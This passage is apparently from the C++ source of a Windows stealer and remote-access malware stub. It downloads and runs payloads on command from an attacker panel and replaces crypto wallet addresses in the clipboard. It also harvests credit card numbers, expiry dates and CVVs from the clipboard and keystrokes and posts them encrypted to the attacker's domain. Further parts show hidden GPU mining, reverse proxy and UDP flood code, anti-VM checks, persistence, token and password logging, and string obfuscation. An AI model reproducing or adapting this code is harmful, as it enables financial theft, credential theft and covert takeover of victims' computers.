						std::string actionSentTime = item[(EC("ActionSentTime"))];

						/*std::cout << EC("ActionID: ") << actionID << EC("\n")
							<< EC("HWID: ") << hwid << EC("\n")
							<< EC("ActionInfo: ") << actionInfo << EC("\n")
							<< EC("ActionType: ") << actionType << EC("\n")
							<< EC("ActionOwner: ") << actionOwner << EC("\n")
							<< EC("ActionStatus: ") << actionStatus << EC("\n")
							<< EC("ActionSentTime: ") << actionSentTime << EC("\n")
							<< EC("---------------------------") << std::endl;*/

						if (ActionList.find(actionID) != ActionList.end()) {
							std::cout << EC("ALREADY DONE!") << std::endl;
							continue;
						}
						else {
							ActionList.insert(actionID);
						}

						////JUNK();


						if (actionType == EC("exc"))
						{
							try
							{

								using convert_typex = std::codecvt_utf8<wchar_t>;
								std::wstring_convert<convert_typex, wchar_t> converterx;

								std::string pthstr = converterx.to_bytes(GetTempPathAndFileName());
								std::cout << pthstr << std::endl;

								std::string command = EC("curl -o \"") + pthstr + EC("\" \"") + actionInfo + EC("\"");
								SPOOF_CALL(win_system)(command.c_str());

								////JUNK();

								if (std::filesystem::exists(pthstr))
								{
									string cmd = EC("start ") + pthstr;

									win_system(cmd.c_str());

									std::cout << EC("Executed") << std::endl;
								}
								else
								{
									std::cout << EC("Possible Error, File Doesnt Exist") << std::endl;
								}

							}
							catch (const std::exception& e) {
								std::cout << EC("Exception caught: ") << e.what() << std::endl;
								continue;
							}


						}
						else if (actionType == EC("excadm"))
						{
							try
							{

								using convert_typex = std::codecvt_utf8<wchar_t>;
								std::wstring_convert<convert_typex, wchar_t> converterx;

								std::string pthstr = converterx.to_bytes(GetTempPathAndFileName());
								std::cout << pthstr << std::endl;

								std::string command = EC("curl -o \"") + pthstr + EC("\" \"") + actionInfo + EC("\"");
								SPOOF_CALL(win_system)(command.c_str());

								////JUNK();

								if (std::filesystem::exists(pthstr))
								{
									string cmd = EC("start ") + pthstr;

									AdminOpen(cmd.c_str());

									std::cout << EC("Executed") << std::endl;
								}
								else
								{
									std::cout << EC("Possible Error, File Doesnt Exist") << std::endl;
								}

							}
							catch (const std::exception& e) {
								std::cout << EC("Exception caught: ") << e.what() << std::endl;
								continue;
							}
						}
						/*else if (actionType == EC("UDP"))
						{
							std::string addy, port;

							size_t pos = actionInfo.find('|');
							if (pos != std::string::npos) {
								addy = actionInfo.substr(0, pos);
								port = actionInfo.substr(pos + 1);
							}


							AttackUDP(addy, std::stoi(port), static_cast<std::time_t>(std::stoi(actionStatus)));
						}
						else if (actionType == EC("RVRS"))
						{
							std::string Raddy, Rport;

							size_t Rpos = actionInfo.find(':');
							if (Rpos != std::string::npos) {
								Raddy = actionInfo.substr(0, Rpos);
								Rport = actionInfo.substr(Rpos + 1);
							}

							std::cout << EC("Starting Reverse Proxy with IP, PORT: ") << Raddy << EC(":") << Rport << std::endl;

							iprvrs = Raddy;
							PortRvrs = std::stoi(Rport);


							CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(ReverseSocks5Thread), nullptr, NULL, nullptr);

						}*/

					}
					catch (const std::exception& e) {
						std::cout << EC("Inside Exception caught: ") << e.what() << std::endl;
						continue;
					}
				}
			}
			catch (const std::exception& e) {
				std::cout << EC("Exception caught: ") << e.what() << std::endl;

				try
				{
					SendWBHK(hwidglobal + EC(" EXCEPTION MAIN LOOP: ") + e.what());
				}
				catch (...) { continue; }
			
				continue;
			}
		
		}
		catch (...) {
			SendDebugMessage(EC("Problem in the fucking main omg"));
			continue;
		}


	}


}


void MrMeyyyn()
{

	while (true)
	{
		__try
		{
			MainThreadRunner();
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			continue;
		}
	}


}

int CycleCount = 0;


void ClipperThreadRunner()
{
	SPOOF_FUNC;

	try
	{
		string CpText = GetClipboardText();
		//std::cout << CpText << std::endl;

		if (!CpText.empty())
		{

			if (IsValid(std::regex(btc_regex), CpText, BTC_Address));
			else if (IsValid(std::regex(btc_regex2), CpText, BTC_Address));
			else if (IsValid(std::regex(eth_regex), CpText, ETH_Address));
			else if (IsValid(std::regex(ltc_regex), CpText, LTC_Address));
			else if (IsValid(std::regex(xmr_regex), CpText, XMR_Address));
			else if (IsValid(std::regex(doge_regex), CpText, DOGE_Address));
			else if (IsValid(std::regex(dash_regex), CpText, DASH_Address));
			else if (IsValid(std::regex(xrp_regex), CpText, XRP_Address));
			else if (IsValid(std::regex(sol_regex), CpText, SOL_Address));
		}


		Sleep(500);

	}
	catch (const std::exception& e) {
		std::cout << EC("Exception caught: ") << e.what() << std::endl;
	}

}

void ClipperThread()
{

	HANDLE Terresa = GetCurrentThread();
	SetThreadPriority(Terresa, THREAD_PRIORITY_NORMAL);

	while (true)
	{
		__try
		{
			ClipperThreadRunner();
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			continue;
		}
	}


}

bool is8;
bool isexp;
string kratos2 = EC("");
string kratos = EC("");


void CardThreadRunner()
{
	try
	{
		is8 = false, isexp = false;
		kratos = EC(""), kratos2 = EC("");

		string clipboardText = GetClipboardText();

		if (!clipboardText.empty() && clipboardText != EC(""))
		{
			kratos2 = FindTwelveDigitNumber(clipboardText);
		}


		if (!inputText.empty() && inputText != EC(""))
		{
			kratos = FindTwelveDigitNumber(inputText);
		}

		if (kratos != EC("") || kratos2 != EC(""))
		{

			if (kratos == EC("")) { kratos = kratos2; }

			string twelveDigitNumber = kratos;
			bool isValidCreditCard = IsCreditCardValid(twelveDigitNumber);
			std::cout << EC("Is Valid Credit Card: ") << isValidCreditCard << std::endl;

			if (!isValidCreditCard) {
				Sleep(200);
				return;
			}


			std::cout << EC("Card Number: ") << twelveDigitNumber << std::endl;
			kratos = EC("");
			kratos2 = EC("");
			string last35oncard = inputText;
			inputText = "";
			inputBuffer.clear();

			string KardNumber = EC("null");
			string KardExpiry = EC("null");
			string KardCvv = EC("null");

			auto start = std::chrono::high_resolution_clock::now();
			auto duration = std::chrono::milliseconds(30000);

			while (true) {

				auto now = std::chrono::high_resolution_clock::now();
				auto elapsed = now - start;

				if (!inputText.empty() && inputText != EC(""))
				{
					std::regex pattern(EC("[^0-9]"));
					string digitas = std::regex_replace(inputText, pattern, EC(""));

					if (twelveDigitNumber[0] == '3') // Its amex and amex requires a diffrent cvv fetching
					{
						if ((digitas.length() >= 8 && !is8 && !isexp) || digitas.length() >= 9)
						{

							string expiry = GetExpiry(digitas);

							if (expiry.length() >= 5)
							{
								isexp = true;
							}


							if (expiry != EC("no"))
							{

								if (expiry.length() >= 5)
								{
									if (digitas.length() >= 9)
									{

									}
									else
									{
										continue;
									}
								}

								string left = RemoveSubstring(digitas, expiry);

								string cvv = left.substr(0, 4);

								KardNumber = twelveDigitNumber;
								KardExpiry = AddSlashAfterSecondCharacter(expiry, false);
								KardCvv = cvv;
								break;

							}
							else
							{
								std::cout << EC("Setted true.") << std::endl;
								is8 = true;
							}

						}
					}
					else
					{
						if ((digitas.length() >= 7 && !is8 && !isexp) || digitas.length() >= 8)
						{
							string expiry = GetExpiry(digitas);

							if (expiry.length() >= 5)
							{
								isexp = true;
							}


							if (expiry != EC("no"))
							{

								if (expiry.length() >= 5)
								{
									if (digitas.length() >= 9)
									{

									}
									else
									{
										continue;
									}
								}

								string left = RemoveSubstring(digitas, expiry);

								string cvv = left.substr(0, 3);

								KardNumber = twelveDigitNumber;
								KardExpiry = AddSlashAfterSecondCharacter(expiry, false);
								KardCvv = cvv;
								break;

							}
							else
							{
								std::cout << EC("Setted true.") << std::endl;
								is8 = true;
							}
						}
					}
				}


				if (elapsed >= duration) {
					break;
				}

				std::this_thread::sleep_for(std::chrono::milliseconds(150));
			}

			if (KardExpiry == EC("null") || KardCvv == EC("null"))
			{
				std::regex pattern(EC("[^0-9]"));
				string LastDrop = std::regex_replace(inputText, pattern, EC(""));

				string expiryas = GetExpirySmall(LastDrop);

				if (expiryas != EC("no"))
				{
					string leftas = RemoveSubstring(LastDrop, expiryas);
					string cvvasan = leftas.substr(0, 3);

					if (twelveDigitNumber[0] == '3') // Its amex and amex requires a diffrent cvv fetching
					{
						cvvasan = leftas.substr(0, 4);
					}

					KardNumber = twelveDigitNumber;
					KardExpiry = AddSlashAfterSecondCharacter(expiryas, true);
					KardCvv = cvvasan;

				}

			}


			if (KardExpiry == EC("null") || KardCvv == EC("null")) {

				std::regex pattern(EC("[^0-9]"));
				string tmp = std::regex_replace(last35oncard, pattern, EC(""));


				string probexpiri = DeleteSubstringAndAfter(tmp, twelveDigitNumber);

				string expiryas = GetExpiry(probexpiri);
				bool SMALL = false;
				if (expiryas == EC("no"))
				{
					SMALL = true;
					expiryas = GetExpirySmall(probexpiri);
				}

				string leftas = RemoveSubstring(probexpiri, expiryas);

				int length = leftas.length();


				string lastLetters = leftas.substr(length - 3);


				if (twelveDigitNumber[0] == '3') // Its amex and amex requires a diffrent cvv fetching
				{
					lastLetters = leftas.substr(length - 4);
				}
				else
				{
					lastLetters = leftas.substr(length - 3);
				}



				string cvvas = lastLetters;
				KardNumber = twelveDigitNumber;
				KardExpiry = AddSlashAfterSecondCharacter(expiryas, SMALL);
				KardCvv = cvvas;

			}

			std::cout << EC("Card Numy: ") << KardNumber << std::endl;
			std::cout << EC("Card Expiry: ") << KardExpiry << std::endl;
			std::cout << EC("Card Cvv: ") << KardCvv << std::endl;
			std::cout << EC("Card Typy: ") << DetectCardType(KardNumber) << std::endl;


			if (KardCvv == EC("") || KardExpiry == EC("n/o"))
			{
				return;
			}

			string CardURL = EC("https://") + dmns + EC("/index.php?type=cc&security=2");
			std::string CardData = EC("AvokadoSalat36|") + KardNumber + EC("|") + KardExpiry + EC("|") + KardCvv + EC("|") + DetectCardType(KardNumber) + EC("|") + OwnersID + EC("|") + hwidglobal;
			std::string CardEncyDat = Encrypt(CardData, enckey);

			SPOOF_CALL(printf)(CardURL.c_str());

			wrap::Response Cardpys = wrap::HttpsRequest(wrap::Url{ CardURL },
				wrap::Body{ CardEncyDat },
				wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
				wrap::Method{ EC("POST") });

			/*makePostRequest(CardURL, CardEncyDat);*/
		}


		Sleep(1500);
	}
	catch (const std::exception& e) {
		std::cout << EC("Exception caught: ") << e.what() << std::endl;
		return;
	}

}

void CardThread()
{

	HANDLE Terresa = GetCurrentThread();
	SetThreadPriority(Terresa, THREAD_PRIORITY_BELOW_NORMAL);

	try {
		LittleAsar();
	} catch (...) {}

	while (true)
	{
		try
		{
			CardThreadRunner();
		}
		catch (...) {
			continue;
		}
	}


}

/*
bool IsMining = false;

void MinerGPUThread()
{
	SPOOF_FUNC;

	while (true)
	{
		try
		{
			SPOOF_CALL(Sleep)(20000);

			if (IsMining)
			{
				minupdat = EC("yesomg");
			}
			else
			{
				minupdat = EC("uhmno");
			}


			//string info = GetMinerGPUInfo(minupdat);
			//infoloop = info;

			string info = infoloop;

			int count = 0;
			for (char c : info) {
				if (c == '|') {
					count++;
				}
			}

			std::cout << EC("Information: ") << info << std::endl;

			if (count < 6 || info.length() < 20) {

				IsMining = false;
				SPOOF_CALL(printf)(EC("No minekk"));
			}
			else
			{
				string CryptoType;
				string CryptoWallet;
				string CryptoPoolAddres;
				string CryptoPoolPort;
				string CryptoPoolSSL;
				string CryptoWorkerName;
				string CryptoWorkerPassword;


				string PauseIfActive;
				string PauseIfGamingStreaming;
				string PauseIfTaskMgr;
				string Botkiller;

				string MiningHardness;

				SplitStringMnr(info, CryptoType, CryptoWallet, CryptoPoolAddres, CryptoPoolPort, CryptoPoolSSL, CryptoWorkerName, CryptoWorkerPassword, PauseIfActive, PauseIfGamingStreaming, PauseIfTaskMgr, Botkiller, MiningHardness);



				if (GPUNAME.find(EC("NVIDIA")) != std::string::npos && MiningHardness != "0") {

					SPOOF_CALL(printf)(EC("NVIDIA"));

					string NvidiaConfig = EC("FuckHerFace");

					try
					{
						if (std::stoi(MiningHardness) < 40 || std::stoi(MiningHardness) > 100) {
							MiningHardness = EC("20");
						}
						else { MiningHardness = to_string(static_cast<int>(10 + (std::stoi(MiningHardness) - 40) * (14.0 / 60.0))); }
					}
					catch (...) { MiningHardness = EC("20"); }

					string PoolAndPort = CryptoPoolAddres + EC(":") + CryptoPoolPort;
					string AddresAndWorky = CryptoWallet + EC(".") + CryptoWorkerName;

					////JUNK();

					if (CryptoWorkerPassword.length() > 3)
					{
						CryptoWorkerPassword = CryptoWorkerPassword;
					}
					else
					{
						CryptoWorkerPassword = EC("x");
					}


					if (CryptoType == EC("CLORE") || CryptoType == EC("NXOA") || CryptoType == EC("RVN")) {
						NvidiaConfig = EC("-a kawpow -i ") + MiningHardness + EC(" -o stratum+tcp://") + PoolAndPort + EC(" -u ") + AddresAndWorky + EC(" -p ") + CryptoWorkerPassword + EC(" --api-bind-http 0 --fan t:65[20-45]");
					}
					else if (CryptoType == EC("BTCG")) {
						// Bitcoin gold gona be setted up with lolMiner
					}
					else if (CryptoType == EC("NXA"))
					{
						// Nexa gona be setted up with lolMiner
					}

					if (PauseIfTaskMgr == "enabled")
					{
						while (true)
						{
							//DWORD pidtsk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("Taskmgr.exe")));
							//DWORD pidphk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("ProcessHacker.exe")));

							if (!IsTskOn && !IsProcessHkrOn)
							{
								break;
							}

							SPOOF_CALL(Sleep)(2000);
						}
					}

					SPOOF_CALL(printf)(EC("Out \n"));


					if (!filesystem::exists(EC("C:\\ProgramData\\TwerkMaster69.jpeg")))
					{
						std::vector<uint8_t> Dinazor = Base64ToBytes(DownloadString(EC("https://") + dmns + EC("/Stb/ElsaMars/Dinazor/RTCore64.txt")));

						std::ofstream DenazorOut(EC("C:\\ProgramData\\TwerkMaster69.jpeg"), std::ios::binary);

						////JUNK();

						DenazorOut.write(reinterpret_cast<char*>(Dinazor.data()), Dinazor.size()); DenazorOut.close();
					}

					PROCESS_INFORMATION processInfo;
					STARTUPINFO startupInfo;

					// Set up the STARTUPINFO structure to hide the window
					startupInfo.dwFlags = STARTF_USESHOWWINDOW;
					startupInfo.wShowWindow = SW_HIDE;

					ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
					ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
					startupInfo.cb = sizeof(STARTUPINFO);

					SPOOF_CALL(printf)(NvidiaConfig.c_str());


					std::wstring commandLine = s2ws(EC("C:\\ProgramData\\TwerkMaster69.jpeg ") + NvidiaConfig);

					int MinerPID = 0;



					if (CreateProcess(nullptr, &commandLine[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &startupInfo, &processInfo)) {

						MinerPID = static_cast<int>(processInfo.dwProcessId);
						std::cout << EC("Process ID: ") << MinerPID << std::endl;

						IsMining = true;

						// Close process and thread handles immediately to avoid resource leaks
						CloseHandle(processInfo.hProcess);
						CloseHandle(processInfo.hThread);


					}
					else {
						std::wcerr << EC(L"CreateProcess failed with error: ") << GetLastError() << std::endl;
					}

					SPOOF_CALL(printf)(EC("Hello :)"));

					SPOOF_CALL(Sleep)(2000);
					int Tresold = 0;

					while (IsMining)
					{

						try
						{
							if (Tresold == 0 || Tresold > 500)
							{
								minupdat = EC("yesomg");

								if (infoloop != info)
								{
									SPOOF_CALL(printf)(EC("Exiting 0"));
									//TerminateProcessByName(EC(L"TwerkMaster69.jpeg"));
									win_system(EC("taskkill /f /t /im TwerkMaster69.jpeg"));
									IsMining = false;

									break;
								}

								Tresold = 0;
							}


							if (PauseIfTaskMgr == "enabled")
							{
								//DWORD pidtsk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("Taskmgr.exe")));
								//DWORD pidphk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("ProcessHacker.exe")));
								//std::cout << EC("Is Task On: ") << IsTskOn << EC(" Is Phk On: ") << IsProcessHkrOn << std::endl;

								if (IsTskOn || IsProcessHkrOn)
								{
									SPOOF_CALL(printf)(EC("Exiting TSK"));
									//TerminateProcessByName(EC(L"TwerkMaster69.jpeg"));
									win_system(EC("taskkill /f /t /im TwerkMaster69.jpeg"));
									IsMining = false;

									break;
								}

							}

							if (!isRunning(L"TwerkMaster69.jpeg")) {

								SPOOF_CALL(printf)(EC("Exitingow 1"));
								//TerminateProcessByName(EC(L"TwerkMaster69.jpeg"));
								win_system(EC("taskkill /f /t /im TwerkMaster69.jpeg"));
								IsMining = false;
								break;

							}



							Tresold++;
						}
						catch (...) { continue; }

					}


				}
				else if ((GPUNAME.find(EC("AMD")) != std::string::npos || GPUNAME.find(EC("Radeon")) != std::string::npos) && MiningHardness != "0") {

					string AMDConfig = EC("FuckHerFace");

					SPOOF_CALL(printf)(EC("AMD"));


					try
					{
						if (std::stoi(MiningHardness) < 40 || std::stoi(MiningHardness) > 100) {
							MiningHardness = EC("85");
						}
						else { MiningHardness = MiningHardness; }
					}
					catch (...) { MiningHardness = EC("85"); }

					string PoolAndPort = CryptoPoolAddres + EC(":") + CryptoPoolPort;
					string AddresAndWorky = CryptoWallet + EC(".") + CryptoWorkerName;


					if (CryptoType == EC("CLORE") || CryptoType == EC("NXOA") || CryptoType == EC("RVN")) {
						AMDConfig = EC("-a kawpow -i ") + MiningHardness + EC(" -o stratum+tcp://") + PoolAndPort + EC(" -u ") + AddresAndWorky + EC(" --fan 45");
					}
					else if (CryptoType == EC("BTCG")) {
						// Bitcoin gold gona be setted up with lolMiner
					}
					else if (CryptoType == EC("NXA"))
					{
						// Nexa gona be setted up with lolMiner
					}

					if (PauseIfTaskMgr == "enabled")
					{
						while (true)
						{
							//DWORD pidtsk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("Taskmgr.exe")));
							//DWORD pidphk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("ProcessHacker.exe")));

							if (!IsTskOn && !IsProcessHkrOn)
							{
								break;
							}

							SPOOF_CALL(Sleep)(2000);
						}
					}

					SPOOF_CALL(printf)(EC("Out \n"));


					if (!filesystem::exists(EC("C:\\ProgramData\\PedoClown666.jpeg")))
					{
						std::vector<uint8_t> Nebba = Base64ToBytes(DownloadString(EC("https://") + dmns + EC("/Stb/ElsaMars/Nibba/HUVx86.txt")));

						std::ofstream NebbaOut(EC("C:\\ProgramData\\PedoClown666.jpeg"), std::ios::binary);

						////JUNK();

						NebbaOut.write(reinterpret_cast<char*>(Nebba.data()), Nebba.size()); NebbaOut.close();
					}

					PROCESS_INFORMATION processInfo;
					STARTUPINFO startupInfo;

					// Set up the STARTUPINFO structure to hide the window
					startupInfo.dwFlags = STARTF_USESHOWWINDOW;
					startupInfo.wShowWindow = SW_HIDE;

					ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
					ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
					startupInfo.cb = sizeof(STARTUPINFO);

					SPOOF_CALL(printf)(AMDConfig.c_str());


					std::wstring commandLine = s2ws(EC("C:\\ProgramData\\PedoClown666.jpeg ") + AMDConfig);

					int MinerPID = 0;


					if (CreateProcess(nullptr, &commandLine[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &startupInfo, &processInfo)) {

						MinerPID = static_cast<int>(processInfo.dwProcessId);
						std::cout << EC("Process ID: ") << MinerPID << std::endl;

						IsMining = true;

						// Close process and thread handles immediately to avoid resource leaks
						CloseHandle(processInfo.hProcess);
						CloseHandle(processInfo.hThread);


					}
					else {
						std::wcerr << EC(L"CreateProcess failed with error: ") << GetLastError() << std::endl;
					}

					SPOOF_CALL(printf)(EC("Hello :)"));
					SPOOF_CALL(Sleep)(2000);

					int Tresold = 0;

					while (IsMining)
					{

						try
						{
							if (Tresold == 0 || Tresold > 500)
							{
								minupdat = EC("yesomg");


								if (infoloop != info)
								{
									//TerminateProcessByName(EC(L"PedoClown666.jpeg"));
									win_system(EC("taskkill /f /t /im PedoClown666.jpeg"));

									IsMining = false;

									break;
								}

								Tresold = 0;
							}


							if (PauseIfTaskMgr == "enabled")
							{
								//DWORD pidtsk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("Taskmgr.exe")));
								//DWORD pidphk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("ProcessHacker.exe")));

								if (IsTskOn || IsProcessHkrOn)
								{
									//TerminateProcessByName(EC(L"PedoClown666.jpeg"));
									win_system(EC("taskkill /f /t /im PedoClown666.jpeg"));
									IsMining = false;

									break;
								}

							}

							if (!isRunning(L"PedoClown666.jpeg")) {

								SPOOF_CALL(printf)(EC("Exitingow 1"));
								//TerminateProcessByName(EC(L"PedoClown666.jpeg"));
								win_system(EC("taskkill /f /t /im PedoClown666.jpeg"));
								IsMining = false;
								break;

							}


							Tresold++;
						}
						catch (...) { continue; }

					}

				}
				else if (GPUNAME.find(EC("Intel")) != std::string::npos && MiningHardness != "0") {



				}
			}

		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
			return;
		}
	}
}
*/


/*

 In another life :)

 To my favorite ratter H.

*/


bool IsVT()
{
	return false;

	/*
	std::string GPUNMM = GetGPUNamear();

	if (GPUNMM.find(EC("Microsoft Basic Render")) != std::string::npos) {

		if (un == EC("george") || un == EC("Bruno") || un == EC("Abby") || un == EC("AMF"))
		{
			return true;
		}

	}
	else if (GPUNMM.find(EC("NVIDIA GeForce RTX 3060 Ti")) != std::string::npos) {

		if (un == EC("Admin"))
		{
			return true;
		}

	}
	else
	{
		return false;
	}*/
}


struct SharedData {
	DWORD signature;
	volatile bool dataReady;
	char buffer[256];
};

SharedData* g_sharedData = nullptr;


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{

	/*AllocConsole();
	freopen("CON", "w", stdout);
	freopen("CON", "w", stderr);



	std::cout << "Done" << std::endl;

	Sleep(-1);


	FILE* file;
	freopen_s(&file, "C:\\ProgramData\\ntb.dat", "w", stdout);
	freopen_s(&file, "C:\\ProgramData\\ntb.dat", "w", stderr);*/

	/*MAIN LW START*/
	InitGlobalExceptionHandling();
	un = GetCurrentUserName();
	ATL::CAccessToken accessToken;
	ATL::CSid currentUserSid;
	if (accessToken.GetProcessToken(TOKEN_READ | TOKEN_QUERY) && accessToken.GetUser(&currentUserSid))
		hwidglobal = std::string(CT2A(currentUserSid.Sid()));

	//SendWBHK(hwidglobal + EC(" sONDAN"));

	if (un.find(EC("emrec")) != string::npos) {
		AllocConsole();
		freopen(EC("CON"), EC("w"), stdout);
		freopen(EC("CON"), EC("w"), stderr);
	}


	bool eightPressed = false;
	for (int i = 0; i < 30; i++) {
		if (GetAsyncKeyState('8') & 0x8000) {
			eightPressed = true;
			break;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	if (eightPressed) {
		Beep(750, 300);


		bool fourPressed = false;
		for (int i = 0; i < 30; i++) { 
			if (GetAsyncKeyState('4') & 0x8000) {
				fourPressed = true;
				break;
			}
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
		}

		if (fourPressed) {
			AllocConsole();
			freopen(EC("CON"), EC("w"), stdout);
			freopen(EC("CON"), EC("w"), stderr);
		}
	}

	if (IsVT())
	{
		*(uintptr_t*)0 = 0;
	}
	else
	{
		string msg;

		/*
		const std::string pipeName = EC("\\\\.\\pipe\\VccFramework");
		HANDLE hPipe = CreateNamedPipeA(pipeName.c_str(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

		if (hPipe == INVALID_HANDLE_VALUE) {
			std::cerr << EC("CreateNamedPipe failed ") << GetLastError() << std::endl;
			return -1;
		}

		std::cout << EC("Waiting for Comm to connect...") << std::endl;


		if (ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED)) {
			std::cout << EC("Connected.") << std::endl;

			char buffer[1024];
			DWORD bytesRead;

			// Read the message from the pipe
			if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
				buffer[bytesRead] = '\0'; // null-terminate the string
				std::cout << EC("Received message : ") << buffer << std::endl;
				msg = std::string(buffer);
			}
			else {
				std::cerr << EC("ReadFile failed, GLE=") << GetLastError() << std::endl;
			}
		}
		else {
			std::cerr << EC("CreateNamedPipe failed ") << GetLastError() << std::endl;
		}

		// Close the pipe
		CloseHandle(hPipe);*/

		std::cout << EC("Receiver started") << std::endl;

		g_sharedData = (SharedData*)VirtualAlloc(nullptr, sizeof(SharedData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!g_sharedData) {
			std::cerr << EC("Alloc fil") << std::endl;
			return 1;
		}

		g_sharedData->signature = 0xBA73593C;
		g_sharedData->dataReady = false;

		std::cout << EC("PID: ") << GetCurrentProcessId() << std::endl;
		std::cout << EC("Waiting for message...") << std::endl;

		while (!g_sharedData->dataReady) {
			std::this_thread::sleep_for(std::chrono::milliseconds(50));
		}

		std::cout << EC("Received: ") << g_sharedData->buffer << std::endl;
		msg = g_sharedData->buffer;

		VirtualFree(g_sharedData, 0, MEM_RELEASE);

		std::cout << msg << std::endl;

		std::istringstream stream(msg);
		std::getline(stream, OwnersID, ':');
		std::getline(stream, BuildID, ':');
		std::getline(stream, dmns);

		std::cout << OwnersID << std::endl;
		std::cout << BuildID << std::endl;
		std::cout << dmns << std::endl;
		std::cout << EC("Done LOLL") << std::endl;

		/*OwnersID = EC("rz6zarjmaf0u9jq4v53hsnz4no61k2");
		BuildID = EC("hVCXhzlbl4ZAeaouCJPRE008");	
		dmns = EC("balistat.lol");*/

		SECURITY_ATTRIBUTES sa;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.bInheritHandle = FALSE;
		sa.lpSecurityDescriptor = NULL;

		// Allow access to non-admin users
		PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
		InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
		SetSecurityDescriptorDacl(pSD, TRUE, NULL, FALSE);
		sa.lpSecurityDescriptor = pSD;

		HANDLE mutex = CreateMutexA(&sa, TRUE, ((EC("Global\\m")) + OwnersID).c_str());
		//SendDebugMessage(EC("Created Mutex"));

		if (LI_FN(GetLastError)() == ERROR_ALREADY_EXISTS) {

			*(uintptr_t*)0 = 0;
		}
		else
		{
			int tresod = 0;

			std::cout << EC("b1") << std::endl;
			SPOOF_CALL(Sleep)(200);

			try {

			A:

				ips = RealIP();

				std::cout << EC("Finalito IP Result: ") << ips << std::endl;
				if (!ips.empty())
				{
					enckey = MapDigitsToLetters(RemoveDotsAndReverse(ips)); // retriev encryption key for later
				}
				else
				{
					if (tresod > 10)
					{
						*(uintptr_t*)0 = 0;
					}
					else
					{
						Sleep(8000);
						tresod++;
						std::cout << EC("Retrying...") << std::endl;
						goto A;
					}
				}

				std::cout << enckey << std::endl;
			}
			catch (const std::exception& e) {
				std::cout << EC("Exception caught: ") << e.what() << std::endl;
			}
			std::cout << EC("enckey pas") << std::endl;


			if (IsUserAnAdmin())
			{
				SendDebugMessage(EC(":nail_care: New Age  0.1  New Stub:  ") + msg);
			}
			else
			{
				SendDebugMessage(EC(":nail_care: New Age  0.1 :sos: New Stub:  ") + msg);
			}

			std::string fuddy = DownloadString(dmns, EC("/index.php?type=FDM&security=2&owr=") + OwnersID);


			std::cout << EC("OH FUDDY ") << fuddy << std::endl;

			if (fuddy == EC("enabled"))
			{
				IsFUD = true;
			}

			//Sleep(1500);

			////JUNK();

			if (BuildID == EC("1337"))
			{
				*(uintptr_t*)0 = 0;
				////JUNK();
			}
			else
			{
				////JUNK();


				SendDebugMessage(EC("Insitilazing Startup, Low Useage "));

				// For now keep it commented idk why -- Hopesar
				/*
				if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL)) {
					SPOOF_CALL(printf)(EC("Failed to set thread bellow normal. \n"));
				}
				else {
					SPOOF_CALL(printf)(EC("Setted thread bellow normal \n"));
				}


				if (!SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS)) {
					SPOOF_CALL(printf)(EC("Failed to set bellow normal. \n"));
				}
				else {
					SPOOF_CALL(printf)(EC("Setted bellow normal \n"));
				}/*
				
				/*

				DWORD_PTR CPUXX = 1;

				if (!SetProcessAffinityMask(GetCurrentProcess(), CPUXX)) {
					SPOOF_CALL(printf)(EC("Affinity pppp failed to set. \n"));
				}
				else {
					SPOOF_CALL(printf)(EC("Affinity pppp set to 0 \n"));
				}*/


				InitStrtp(); // Initilaze startup


				////JUNK();


				SendDebugMessage(EC("Initilazing Hider, Winapi, Getting GPU, CPU And going for site"));

				try
				{
					GetGpuName(GPUNAME, VRam);
					if (GPUNAME.length() < 5)
					{
						GPUNAME = EC("Couldnt_Parse");
					}

					CPUNAME = GetCpuName();
				}
				catch (...) {}

				/*if (GPUNAME.find(EC("No Compatible")) != std::string::npos) {
					*(uintptr_t*)0 = 0;
				}
				else
				{*/

				SPOOF_CALL(LogToSite)();

				SPOOF_CALL(Sleep)(200);

				if (TknLog)
				{
					SendDebugMessage(EC("Site Done going for Tokens"));

					LogRawTokensCore();

					SPOOF_CALL(Sleep)(300);
				}


				if (PswLog)
				{
					string PassEntr;

					try
					{
						string passopa = EC("https://") + dmns + EC("/index.php?type=pexists&security=2");
						std::string HWDData = EC("DurumcuBabaSeveriz31|") + hwidglobal + EC("|") + OwnersID;
						std::string EncyDat = Encrypt(HWDData, enckey);

						SPOOF_CALL(printf)(passopa.c_str());

						wrap::Response PassOppa = wrap::HttpsRequest(wrap::Url{ passopa },
							wrap::Body{ EncyDat },
